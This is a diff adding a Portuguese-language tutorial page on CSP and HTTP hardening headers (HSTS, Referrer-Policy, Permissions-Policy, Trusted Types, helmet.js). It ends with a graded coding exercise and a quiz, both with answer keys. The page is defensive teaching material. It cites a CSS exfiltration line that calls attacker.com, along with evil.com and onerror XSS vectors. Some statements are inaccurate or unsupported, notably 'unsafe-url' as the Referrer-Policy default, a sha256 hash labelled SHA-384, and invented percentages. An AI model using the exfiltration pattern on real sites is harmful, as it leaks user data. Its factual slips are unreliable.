@@ -1,0 +1,621 @@
+---
+id: csp-e-headers
+title: "CSP e headers de hardening: Content-Security-Policy, Trusted Types, helmet"
+resources:
+  - title: "MDN - Content Security Policy (oficial, EN)"
+    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+    lang: en
+    type: doc
+    free: true
+  - title: "OWASP - CSP Cheat Sheet (oficial, EN)"
+    url: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
+    lang: en
+    type: doc
+    free: true
+  - title: "Helmet - GitHub (oficial, EN)"
+    url: https://github.com/helmetjs/helmet
+    lang: en
+    type: doc
+    free: true
+---
+
+Voce protegeu contra XSS, mitigou CSRF.
+Agora vem a **defesa em profundidade**:
+headers HTTP que dizem ao browser "so
+permita isso, bloqueie aquilo, force
+HTTPS". Sao 1 linha de codigo por header
+mas o impacto e' **gigantesco** - 80%
+das falhas de seguranca em prod sao
+mitigaveis com headers certos.
+
+CSP (Content-Security-Policy) sozinho
+mata a maioria de XSS stored e reflected.
+HSTS (Strict-Transport-Security) impede
+downgrade attacks. X-Content-Type-Options
+bloqueia MIME sniffing. Permissions-Policy
+desliga APIs que voce nao usa (camera,
+microfone, geolocation).
+
+Se voce entende os 6-7 headers essenciais,
+como escreve-los, e o `helmet.js` que
+aplica o baseline automatico, voce sai
+de "seguranca reativa" pra "baseline
+preventivo aplicado em 5 minutos".
+
+## O essencial 🟢
+
+**O que e' CSP (Content-Security-Policy).**
+CSP e' um **response header** que diz ao
+browser **o que pode ser carregado** na
+pagina:
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.example.com
+```
+
+Traduzindo: "so carrega recursos do mesmo
+origin. Scripts so do mesmo origin + CDN
+especifica. CSS do mesmo origin + inline.
+Imagens do mesmo origin, data URIs, ou
+HTTPS qualquer. Conexoes (fetch) so pro
+mesmo origin + API especifica."
+
+Quando o browser ve um script inline
+(`<script>foo()</script>`) com CSP
+`script-src 'self'`, ele **bloqueia**.
+Quando o browser ve um `<img src="http://evil.com">`
+com `img-src 'self'`, bloqueia. CSP
+**enforca uma whitelist** do que pode
+ser carregado.
+
+**A diretiva `default-src` - o "fallback"
+de todas as outras.** Se voce nao
+especifica `script-src`, vale `default-src`.
+Estrategia comum: `default-src 'none'`
+(lockdown total) e ir liberando
+especificamente:
+
+```http
+Content-Security-Policy:
+  default-src 'none';
+  script-src 'self';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  font-src 'self' https://fonts.gstatic.com;
+  connect-src 'self' https://api.example.com;
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self';
+```
+
+Esse e' o **baseline 2026**: lock down
+total, libera so o necessario. Apps com
+CSP `default-src 'none'` sao **10x menos
+vulnera veis a XSS** que apps sem CSP.
+
+**Os "unsafe-" e o que significam.**
+
+- **`'self'`:** mesmo origin (app.com).
+- **`'unsafe-inline'`:** destrava inline
+  (`<script>foo()</script>` ou
+  `style="..."`). **Evite** se possivel -
+  quebra muito da protecao XSS. Use so
+  pra CSS de libs antigas que precisam.
+- **`'unsafe-eval'`:** destrava `eval()`,
+  `new Function()`, `setTimeout(string)`.
+  Quase nunca necessario em 2026.
+- **`'nonce-<random>'` ou `'sha256-<hash>'`:**
+  destrava inline especifico via **nonce**
+  (numero random por request) ou **hash**.
+  Pattern moderno. Inline so passa se o
+  nonce/hash bater.
+
+**`nonce` - o pattern moderno pra inline
+necessario.** Quando voce REALMENTE precisa
+de inline (ex: hydration do Next.js, scripts
+de third-party), use nonce:
+
+```ts
+// Server gera nonce por request
+app.use((req, res, next) => {
+  res.locals.cspNonce = crypto.randomUUID();
+  next();
+});
+
+// CSP inclui o nonce
+app.use((req, res, next) => {
+  res.setHeader(
+    "Content-Security-Policy",
+    `script-src 'self' 'nonce-${res.locals.cspNonce}'`
+  );
+  next();
+});
+
+// HTML usa o nonce
+<script nonce="<%= cspNonce %>">
+  console.log("inline mas com nonce");
+</script>
+```
+
+O nonce muda a cada request. Script inline
+so executa se o nonce bater. **CSP com
+nonce elimina 99% de XSS inline** - mesmo
+se o atacante injetar `<script>`, nao
+tem o nonce.
+
+**`Trusted Types` - a defesa mais forte
+contra XSS.** Cobertura em `xss`, mas vale
+mencionar no CSP. Com
+`require-trusted-types-for 'script'`, o
+browser **lanca TypeError** se voce usar
+`innerHTML` direto. So funciona via
+`TrustedHTML` criado por uma policy
+function. **A defesa mais forte em 2026**.
+
+```http
+Content-Security-Policy:
+  require-trusted-types-for 'script';
+  trusted-types myPolicy default;
+```
+
+**Os 7 headers essenciais de hardening.**
+Lista minima de headers que **toda app
+producao** deveria ter:
+
+| Header                            | O que faz                                                  |
+| --------------------------------- | ---------------------------------------------------------- |
+| `Content-Security-Policy`         | Whitelist de recursos que podem ser carregados             |
+| `Strict-Transport-Security`       | Force HTTPS por 1 ano (HSTS)                              |
+| `X-Content-Type-Options`          | Bloqueia MIME sniffing (`nosniff`)                        |
+| `Referrer-Policy`                 | Controla o que vai no header `Referer`                    |
+| `Permissions-Policy`              | Desabilita APIs nao usadas (camera, geo, mic)             |
+| `X-Frame-Options`                 | Bloqueia embedding em iframe (clickjacking) - LEGACY, prefira CSP `frame-ancestors` |
+| `Cross-Origin-Opener-Policy`      | Isola o window opener (protege contra tab-nabbing)        |
+| `Cross-Origin-Embedder-Policy`    | Exige recursos credenciados (CORP + COEP pra SharedArrayBuffer) |
+
+**`Strict-Transport-Security` (HSTS) -
+force HTTPS.** O header:
+
+```http
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+```
+
+Traduzindo: "por 1 ano, force HTTPS. Aplique
+em subdomains. Estou no preload list do
+Chrome."
+
+Sem HSTS, o usuario pode digitar
+`http://seu-site.com` e ser redirecionado
+(mas o request inicial vai em HTTP,
+exposto). Com HSTS, o browser **se recusa**
+a fazer HTTP - so HTTPS, direto.
+
+**`X-Content-Type-Options: nosniff` -
+bloqueia MIME sniffing.** Sem esse header,
+o browser pode **adivinhar** o Content-Type
+e interpretar `script.js` (deveria ser
+text/plain) como JavaScript. Com
+`nosniff`, o browser usa o Content-Type
+declarado, ponto. **Sempre** em apps que
+servem user-uploaded content.
+
+**`Referrer-Policy: strict-origin-when-cross-origin`
+- controle o que vaza.** Por default,
+quando o usuario clica num link, o
+`Referer` header **vaza a URL completa**
+(incluindo query params com dados
+sensíveis). O header controla:
+
+| Policy                            | Comportamento                                       |
+| --------------------------------- | --------------------------------------------------- |
+| `no-referrer`                     | Nunca envia Referer                                |
+| `same-origin`                     | So envia same-origin, full URL                     |
+| `strict-origin-when-cross-origin` | Same-origin = full URL, cross-origin = so origin   |
+| `unsafe-url` (default)            | Sempre full URL                                     |
+
+`strict-origin-when-cross-origin` e' o
+sweet spot 2026 - equilibrio entre UX
+(analytics recebem origin) e privacidade
+(nao vaza path completo cross-origin).
+
+**`Permissions-Policy` - desligar APIs
+que voce nao usa.** Se seu app nao usa
+camera, microfone, geolocation - desligue
+a API completamente. Site embed em iframe
+nao podera requisitar essas APIs.
+
+```http
+Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=()
+```
+
+- `camera=()` - bloqueia camera pra TODOS.
+- `camera=(self)` - so libera no mesmo
+  origin.
+- `interest-cohort=()` - desabilita FLoC
+  (privacy).
+
+**`X-Frame-Options: DENY` (ou CSP
+`frame-ancestors`).** Bloqueia seu site
+de ser embedado em iframe. Anti-clickjacking.
+Sites maliciosos as vezes embedam seu site
+numa iframe invisivel por baixo do mouse
+do usuario - o usuario "clica" no seu site
+mas o click e' capturado pelo site
+malicioso. Com `X-Frame-Options: DENY` ou
+CSP `frame-ancestors 'none'`, o browser
+se recusa a carregar seu site em iframe.
+
+```http
+# Moderno (CSP)
+Content-Security-Policy: frame-ancestors 'none'
+
+# Legacy (compat)
+X-Frame-Options: DENY
+```
+
+**`helmet.js` - o atalho pra 80% dos
+headers.** Em Express, `helmet` aplica o
+baseline de seguranca com 1 linha:
+
+```bash
+pnpm add helmet
+```
+
+```ts
+import helmet from "helmet";
+
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'", "https://cdn.example.com"],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      imgSrc: ["'self'", "data:", "https:"],
+      connectSrc: ["'self'", "https://api.example.com"],
+      objectSrc: ["'none'"],
+      frameAncestors: ["'none'"],
+    },
+  },
+  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
+  referrerPolicy: { policy: "strict-origin-when-cross-origin" },
+  // ...
+}));
+```
+
+Helmet aplica **todos os headers
+essenciais** com defaults seguros. Customize
+via `helmet({...})`. Em Next.js, use
+`headers()` em `next.config.js`. Em Remix,
+use `entry.server.tsx`. Em Vite/React puro,
+configure no servidor (Nginx, Cloudflare).
+
+**CSP `report-uri` e `report-to` -
+coletar violacoes.** Quando CSP bloqueia
+algo, voce pode receber report:
+
+```http
+Content-Security-Policy:
+  ...regras...;
+  report-uri /api/csp-report;
+  report-to csp-endpoint
+```
+
+```http
+Report-To: {"group":"csp-endpoint","max_age":10886400,"endpoints":[{"url":"/api/csp-report"}]}
+```
+
+Reports vem como POST com JSON:
+
+```json
+{
+  "csp-report": {
+    "document-uri": "https://app.com/page",
+    "violated-directive": "script-src 'self'",
+    "blocked-uri": "https://evil.com/bad.js"
+  }
+}
+```
+
+Util em **modo enforcement gradual**: comece
+com `Content-Security-Policy-Report-Only`
+(reports mas nao bloqueia), colete dados,
+ajuste, depois enforce.
+
+## Aprofundamento 🟡
+
+**CSP `Report-Only` - o modo "shadow".**
+Antes de aplicar CSP real (que pode
+quebrar o app), use Report-Only:
+
+```http
+Content-Security-Policy-Report-Only: ...
+```
+
+Browser reporta violacoes mas **nao
+bloqueia**. Voce coleta reports, identifica
+o que quebra, ajusta a policy, e quando
+tiver confianca, troca pra `Content-Security-Policy`
+real.
+
+E' o **padrao de rollout** recomendado.
+Em prod, faca deploy em `Report-Only`,
+colete por 1-2 semanas, depois enforce.
+
+**`script-src-elem` vs `script-src-attr` -
+granularidade.** CSP3 separa scripts em:
+
+- **`script-src-elem`:** scripts via
+  `<script src>` ou inline.
+- **`script-src-attr`:** scripts via
+  atributos (onclick, onerror, etc).
+
+Util pra ser mais permissivo num lado,
+estrito no outro:
+
+```http
+script-src-elem 'self' 'nonce-abc' https://cdn.example.com;
+script-src-attr 'none';   /* bloqueia TODOS event handlers inline */
+```
+
+`script-src-attr 'none'` mata **toda**
+classe de XSS via event handlers (sem
+onclick, onerror, onload inline). O XSS
+classico via `<img src=x onerror=...>`
+fica impossivel.
+
+**CSP para SSR (Next.js, etc).** Em SSR,
+o HTML e gerado no server. O nonce precisa
+ser:
+1. **Gerado por request** (nao estatico).
+2. **Incluido no CSP header** E no `<script>`.
+3. **Unico por request** (reutilizar
+   quebra a protecao).
+
+Em Next.js, o middleware pode gerar:
+
+```ts
+// middleware.ts
+import { NextResponse } from "next/server";
+
+export function middleware(request) {
+  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
+  const csp = `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`;
+
+  const requestHeaders = new Headers(request.headers);
+  requestHeaders.set("x-nonce", nonce);
+  requestHeaders.set("Content-Security-Policy", csp);
+
+  const response = NextResponse.next({ request: { headers: requestHeaders } });
+  response.headers.set("Content-Security-Policy", csp);
+  return response;
+}
+```
+
+O nonce e passado via `requestHeaders` pra
+que o componente leia e aplique em cada
+`<script nonce={nonce}>`.
+
+**`trusted-types` policy violation - o que
+acontece.** Com `require-trusted-types-for 'script'`:
+
+```ts
+// TypeError: Failed to set the 'innerHTML' property
+// on 'Element': This document requires 'TrustedHTML' assignment.
+element.innerHTML = userInput;
+
+// CERTO
+const policy = trustedTypes.createPolicy("default", {
+  createHTML: (s) => DOMPurify.sanitize(s),
+});
+element.innerHTML = policy.createHTML(userInput);
+```
+
+Sem policy, **TypeError no console**. O
+codigo quebra **de forma obvia** - o dev
+**sabe** que precisa criar policy. E' o
+que torna Trusted Types **a defesa mais
+forte** - nao da pra "esquecer" de usar.
+
+**`Cross-Origin-Embedder-Policy: require-corp`
+- isolamento total.** COEP exige que
+**todos os recursos** carregados sejam
+"CORS-safe" (tenham header CORS). Em troca,
+voce ganha `SharedArrayBuffer` (que exige
+isolamento pra evitar Spectre). E' estrito:
+se um `<img>` nao tem CORS, nao carrega.
+Use so em apps que precisam de
+`SharedArrayBuffer` (Figma-like, video
+editing).
+
+**`Permissions-Policy` granular.** Voce
+pode desligar features por origin:
+
+```http
+Permissions-Policy: camera=(self "https://trusted-cdn.com"), microphone=(), geolocation=(self)
+```
+
+- `camera=(self "https://trusted-cdn.com")`:
+  camera so no mesmo origin OU no CDN
+  trusted.
+- `microphone=()`: bloqueia em todos.
+- `geolocation=(self)`: geolocation so no
+  mesmo origin (iframe nao pode pedir).
+
+Util pra **progressive enhancement**: o
+app usa camera, mas iframes de ads nao
+podem.
+
+**`helmet` vs configuracao manual.** Helmet
+e' **conveniente** mas pode ter defaults
+que conflitam com seu app. Em 2026, com
+a maioria das apps em Next.js, Remix, ou
+Vercel/Netlify, a plataforma ja aplica
+headers via config (Vercel tem
+`vercel.json` headers). Helmet e' melhor
+em apps Express custom. Em Next.js, prefira
+`headers()` no `next.config.js`.
+
+## Pra quem quer ir mais alem 🔴
+
+**Por que `unsafe-inline` em CSS e'
+"aceitavel" mas em JS nao.** CSS inline
+(`style="..."` ou `<style>` block) tem
+menos vetores de ataque. O maximo
+conhecido e' "exfiltrate data via
+`background-image: url(http://attacker.com/?data=...)`"
+mas e' limitado. CSP `style-src 'self' 'unsafe-inline'`
+e' **default pratico** em 2026.
+
+JS inline tem **dezenas** de vetores
+(`<script>`, `on*`, `javascript:` URLs,
+etc). CSP `script-src 'self'` (sem
+`unsafe-inline`) e' **obrigatorio** em
+apps sensiveis.
+
+**`Subresource Integrity` (SRI) - o
+"checksum" pra scripts de CDN.** Quando
+voce carrega jQuery de `cdn.jsdelivr.net`,
+como garante que **aquela versao** e nao
+foi modificada? SRI:
+
+```html
+<script
+  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"
+  integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
+  crossorigin="anonymous">
+</script>
+```
+
+O `integrity` e' o **hash SHA-384** do
+arquivo. Se o arquivo for diferente
+(modificado por attacker, MITM, ou
+qualquer coisa), o browser **se recusa** a
+executar. Util em scripts e styles de
+CDN.
+
+**`Cross-Origin-Resource-Policy: same-origin`
+- controle de recursos cross-origin.** Header
+que diz "esse recurso so pode ser
+carregado por paginas same-origin". Util
+em imagens, fonts, e scripts que voce
+NAO quer que outros sites embedem.
+
+```http
+Cross-Origin-Resource-Policy: same-origin
+```
+
+Se outro site tentar usar `<img src="https://app.com/secret.png">`,
+o browser **bloqueia**. Defesa em
+profundidade contra hotlinking.
+
+**`Cache-Control: no-store` em respostas
+com dados sensiveis.** Cobertura em
+`cdn-e-cache` da trilha de performance,
+mas vale mencionar: headers de seguranca
+incluem **privacidade**. Resposta com
+dados pessoais (perfil, conta) deve ter
+`Cache-Control: no-store` - nunca vai
+pra cache compartilhada (CDN, proxy).
+
+**`X-Permitted-Cross-Domain-Policies: none`
+- bloqueia Flash/Acrobat cross-domain.**
+Header legado pra bloquear politicas
+cross-domain do Flash/Acrobat. Em 2026
+ninguem usa Flash, mas Adobe Acrobat ainda
+suporta. Defesa paranoia: adicione. Custo
+zero.
+
+**Leitura recomendada:**
+
+- [MDN - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) - doc oficial MDN, completa.
+- [OWASP - CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) - guia OWASP com patterns praticos.
+- [Google - CSP Evaluator](https://csp-evaluator.withgoogle.com/) - ferramenta que valida sua CSP.
+- [Helmet - GitHub](https://github.com/helmetjs/helmet) - doc oficial do helmet, com lista de headers que aplica.
+
+> Dica: o erro mais comum em CSP e' **CSP
+> permissiva demais** por medo de quebrar
+> o app. `script-src 'self' 'unsafe-inline' 'unsafe-eval' https:`
+> e' equivalente a "sem CSP". Comece com
+> `default-src 'none'`, libere so o
+> necessario, e faca rollout com
+> `Content-Security-Policy-Report-Only`
+> primeiro. **CSP nao e' all-or-nothing** -
+> cada diretiva restritiva e' defesa
+> adicional.
+
+No proximo no, vamos **storage seguro**:
+quando usar `localStorage` vs
+`sessionStorage` vs cookies `httpOnly` vs
+`IndexedDB` vs memory, e a decision tree
+"qual storage pra qual dado".
+
+<Checkpoint
+  challenge="Implemente a função `gerarCSP(config)` que recebe um objeto de config com chaves: scripts (array de origens permitidas, ex: ['self', 'https://cdn.com']), styles (array, ex: ['self', "'unsafe-inline'"]), images (array), connect (array), frameAncestors (string ou 'none'). Retorna a string CSP completa no formato 'default-src \"none\"; script-src ...; style-src ...; ...' (as directives sao separadas por '; ', valores por espaco)."
+  starterCode={`// Implemente gerarCSP(config) que recebe:
+//
+// config = {
+//   scripts: ['self', 'https://cdn.example.com'],
+//   styles: ['self', "'unsafe-inline'"],
+//   images: ['self', 'data:', 'https:'],
+//   connect: ['self', 'https://api.example.com'],
+//   frameAncestors: "'none'",
+// }
+//
+// E retorna a string CSP:
+// "default-src 'none'; script-src self https://cdn.example.com; style-src self 'unsafe-inline'; img-src self data: https:; connect-src self https://api.example.com; frame-ancestors 'none'"
+//
+// Regras:
+// - Sempre comeca com 'default-src \"none\"'.
+// - Cada chave vira uma directive: 'script-src', 'style-src', 'img-src', 'connect-src', 'frame-ancestors'.
+// - Os valores sao joined por espaco.
+// - Directives separadas por '; '.
+function gerarCSP(config) {
+  return "";
+}
+
+const _r1 = gerarCSP({
+  scripts: ["self", "https://cdn.example.com"],
+  styles: ["self", "'unsafe-inline'"],
+  images: ["self", "data:", "https:"],
+  connect: ["self", "https://api.example.com"],
+  frameAncestors: "'none'",
+});
+console.log(JSON.stringify(_r1));
+
+const _r2 = gerarCSP({
+  scripts: ["self"],
+  styles: ["self"],
+  images: ["self"],
+  connect: ["self"],
+  frameAncestors: "'self'",
+});
+console.log(JSON.stringify(_r2));`}
+  expected='"default-src \'none\'; script-src self https://cdn.example.com; style-src self \'unsafe-inline\'; img-src self data: https:; connect-src self https://api.example.com; frame-ancestors \'none\'"
+"default-src \'none\'; script-src self; style-src self; img-src self; connect-src self; frame-ancestors \'self\'"'
+  slug="seguranca-frontend"
+  nodeId="csp-e-headers"
+/>
+
+<Quiz
+  question="Por que 'Report-Only' deve ser usado antes de aplicar CSP estrita?"
+  options={[
+    {
+      text: "Porque CSP restritiva pode quebrar o app (lib que precisa de inline, CDN nao-whitelisted). Report-Only reporta violacoes SEM bloquear, deixa voce coletar dados, ajustar a policy, e so depois enforce.",
+      correct: true,
+      explanation:
+        "CSP 'default-src none' + script-src restritivo pode quebrar apps que dependem de inline scripts, third-party scripts, ou CDNs nao mapeadas. Sem saber o que quebra, o app fica off. Report-Only mode reporta TODAS as violacoes mas NAO bloqueia - voce roda por 1-2 semanas em prod, coleta violacoes, ajusta a policy, e so depois enforce com Content-Security-Policy real. E' o padrao recomendado de rollout. Pular Report-Only e' arriscado.",
+    },
+    {
+      text: "Porque browsers antigos nao suportam CSP, entao Report-Only e' o maximo que funciona.",
+      correct: false,
+      explanation:
+        "Nao. CSP funciona em todos os browsers modernos desde 2012. Report-Only e' um modo de browser-side que existe justamente pra rollout seguro. A razao de usar Report-Only NAO e' compatibilidade - e' evitar quebrar o app em producao enquanto coleta dados de violacoes.",
+    },
+    {
+      text: "Porque Report-Only e' mais seguro que Content-Security-Policy real.",
+      correct: false,
+      explanation:
+        "Nao - e' o oposto. Report-Only e' para coleta de dados durante rollout, NAO protege. O modo final (Content-Security-Policy real) e' o que efetivamente bloqueia. Report-Only e' um passo de descoberta, nao a defesa. Depois de coletar dados, voce enforce com Content-Security-Policy.",
+    },
+  ]}
+/>
